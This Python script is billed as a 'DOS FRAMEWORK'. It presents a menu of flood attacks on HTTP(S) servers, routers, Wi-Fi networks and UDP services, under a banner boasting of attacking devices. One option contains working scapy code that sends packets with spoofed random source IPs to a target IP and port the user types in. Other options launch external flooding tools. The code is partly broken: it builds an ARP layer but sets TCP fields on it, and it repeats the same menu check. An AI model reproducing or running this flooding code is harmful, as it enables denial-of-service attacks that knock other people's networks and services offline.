import os 
import time 
import sys 
import colorama 
import requests 
import random
import scapy 
import scapy.all as scapy
from os import system
from sys import stdout
from scapy.all import *
import scapy 
from random import randint
from scapy import *
from colorama import Fore 
from colorama import Back
from colorama import Style 
from colorama import init

def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd() # if else restart program 

def screen_clear():
   if name == 'nt':
      _ = system('cls')  # cls for window compatibility in win32-64 

def CS(X):          # CS = clear sleep
   time.sleep(X)
   os.system("clear")



init()

#COLOR FORGROUND 
#ESC [ 30 m      # black
#ESC [ 31 m      # red
#ESC [ 32 m      # green
#ESC [ 33 m      # yellow
#ESC [ 34 m      # blue
#ESC [ 35 m      # magenta
#ESC [ 36 m      # cyan
#ESC [ 37 m      # white
#ESC [ 39 m      # reset


banner = '''

_______________________________________________________________________________________________________
: ........... _/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/      :
: .......... _/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/       :
: ......... _/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/        :
: ........ _/_/_/                                                                     _/_/_/ .        :
: ....... _/_/_/                    ____  ___________  _______ ____________           _/_/_/ ..       :
: ......  _/_/_/                    / __ \/ ____// __ \/   ___// ___// ____/\         _/_/_/ ...      :  
: .....   _/_/_/                   / / / / __/ // / / /\___ \// __/\/ /\___\          _/_/_/ ....     :
: ....    _/_/_/                  / /_/ / /__ // /_/ /____/ // /__ / /_/              _/_/_/ .....    : 
: ...     _/_/_/                 /_____/_____//_____//_____//_____/\ ____/\           _/_/_/ .......  : 
: ..      _/_/_/                 /_____/_____//_____//_____//_____/\ ____/\           _/_/_/ .......  : 
: .       _/_/_/                                       DOS FRAMEWORK V1.0             _/_/_/ .........: 
:_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/___________:

'''



time.sleep(1)
os.system(' clear ')


print('\033[30m' + '_______________________________________________________________________________________________________')
time.sleep(0.1)
print('\033[30m' + ': ........... _/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/      :')
time.sleep(0.1)
print('\033[30m' + ': .......... _/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/       :')
time.sleep(0.1)
print('\033[30m' + ': ......... _/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/        :')
time.sleep(0.1)
print('\033[30m' + ': ........ _/_/_/                                                                     _/_/_/ .        :')
time.sleep(0.1)
print('\033[34m' + ': ....... _/_/_/                    ____  ___________  _______ ____________           _/_/_/ ..       :')
time.sleep(0.1)
print('\033[34m' + ': ......  _/_/_/                    / __ \/ ____// __ \/   ___// ___// ____/\         _/_/_/ ...      :  ')
time.sleep(0.1)
print('\033[34m' + ': .....   _/_/_/                   / / / / __/ // / / /\___ \// __/\/ /\___\          _/_/_/ ....     :')
time.sleep(0.1)
print('\033[34m' + ': ....    _/_/_/                  / /_/ / /__ // /_/ /____/ // /__ / /_/              _/_/_/ .....    : ')
time.sleep(0.1)
print('\033[34m' + ': ...     _/_/_/                 /_____/_____//_____//_____//_____/\ ____/\           _/_/_/ .......  : ')
time.sleep(0.1)
print('\033[34m' + ': ..      _/_/_/                 /_____/_____//_____//_____//_____/\ ____/\           _/_/_/ .......  : ')
time.sleep(0.1)
print('\033[34m' + ': .       _/_/_/                                       DOS FRAMEWORK V1.0             _/_/_/ .........: ')
time.sleep(0.1)
print('\033[30m' + ':_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/___________:')
time.sleep(0.1)
print('\033[31m' + ':=====================================================================================================:')
time.sleep(0.1)
print('\033[31m' + ':                                                                                                     :')
time.sleep(0.1)
print('\033[31m' + ':                            Created by: RE43P3R / ArkAngeL43                                         :')
time.sleep(0.1)
print('\033[31m' + ':                                                            fuck over https                          :')
time.sleep(0.1)
print('\033[31m' + ':                                                                          fuck wifi                  :')
time.sleep(0.1)
print('\033[31m' + ':                                                                                  fuck devices       : ')
time.sleep(0.1)
print('\033[31m' + ':=====================================================================================================: ')
time.sleep(0.1)
print('\033[31m' + ':  Option [1] => slow all layers                  =>           |Tool|       =>    [Raven Storm]      :')
time.sleep(0.1)
print('\033[31m' + ':  Option [2] =>  Slow Http                       =>           |Tool|       =>    [MAL.py     ]      :')
time.sleep(0.1)
print('\033[31m' + ':  Option [3] =>  Slow apache                     =>           |Tool|       =>    [DDoS ripper]      : ')
time.sleep(0.1)
print('\033[31m' + ':  Option [4] =>  Slow https/http                 =>           [Tool]       =>    [DDoS Hammer]      : ')
time.sleep(0.1)
print('\033[31m' + ':  Option [5] =>  FLOOD http/s                    =>           [Tool]       =>    [Syn Corn   ]      : ')
time.sleep(0.1)
print('\033[31m' + ':  Option [6] =>  ping of death flood any router  =>           [Tool]       =>    [HPING3     ]      : ')
time.sleep(0.1)
print('\033[31m' + ':  Option [7] =>  FLOOD all networks in range     =>           [Tool]       =>    [BESSIDE-NG ]      : ')
time.sleep(0.1)
print('\033[31m' + ':  Option [8] =>  UDP Flood                       =>           [Tool]       =>    [UDP-Corn   ]      : ')
time.sleep(0.1)
print('\033[31m' + ':____________________________________________________________________________________________________:  ')

A = str(input(" Options @> "))

time.sleep(1)

if '2' == A:
     os.system(' sudo apt-get update ')
     time.sleep(1)
     print(' [!] loading modules [!] ')
     CS(2)
     print(banner)
     time.sleep(1)
     def randomIP():
          ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
          return ip


     def randInt():
          x = randint(1000,9000)
          return x


     def TCP_Flood(dstIP,dstPort,counter):
          total = 0
          print ("Packets are sending ...")

          for x in range (0,counter):
               s_port = randInt()
               s_eq = randInt()
               w_indow = randInt()

               IP_Packet = IP ()
               IP_Packet.src = randomIP()
               IP_Packet.dst = dstIP

               ARP_Packet = ARP ()
               ARP_Packet.sport = s_port
               ARP_Packet.dport = dstPort
               ARP_Packet.flags = "S"
               ARP_Packet.seq = s_eq
               ARP_Packet.window = w_indow

               send(IP_Packet/ARP_Packet, verbose=0)
               total+=1

          stdout.write("\nTotal packets sent: %i\n" % total)


     def info():
          CS(2)
          print (":...................................:")
          print (":            MALFORMED              :")
          print ("....................................:")

          dstIP = input ("\nTarget IP : ")
          dstPort = input ("Target Port : ")

          return dstIP,int(dstPort)


     def main():
          dstIP,dstPort = info()
          counter = input ("How many packets do you want to send : ")
          TCP_Flood(dstIP,dstPort,int(counter))

     main()

elif '2' == A:
     CS(2)
     print("[+] starting raven storm [+] ")
     os.system(' ravenstorm ')
     CS(3)
     print(" Thanks for stopping by :D [!]")


elif '5' == A:
     time.sleep(1)
     CS(2)
     print(" [=] running modules ")
     os.system(' sudo python3 SYN.py ')

else: 
     print(" Thats not a command ")
     restart_program()